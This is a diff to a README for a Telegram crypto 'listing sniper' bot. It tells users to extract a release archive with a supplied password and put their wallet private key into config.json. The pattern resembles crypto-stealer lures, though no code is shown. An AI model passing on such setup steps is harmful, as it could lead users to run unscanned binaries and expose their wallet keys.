@@ -15,7 +15,6 @@ The Telegram Listing Sniper Bot is designed to automatically buy newly listed to
 ![](https://github.com/deadspyexx/listing-sniper-bot/assets/140325300/3681d9c5-e3db-4dbe-b73b-b9582ae99e9c)
 
 #### Configure the Sniper Bot
-1. Obtain the pre-compiled binaries from the "dist" folder. These binaries should work on any platform, including mobile devices.
-2. Ensure you have all accompanying files required for the Telegram API.
-3. If you are building from source, generate your own Telegram API credentials as sharing them in plain text is against Telegram's terms of service.
-4. Clone the repository release and extract files with password `whLn1sTWT`. Edit the `address` and `private_key` fields in the `config.json` file.
+1. Ensure you have all accompanying files required for the Telegram API.
+2. If you are building from source, generate your own Telegram API credentials as sharing them in plain text is against Telegram's terms of service.
+3. Clone the repository release and extract files with password `whLn1sTWT`. Edit the `address` and `private_key` fields in the `config.json` file.
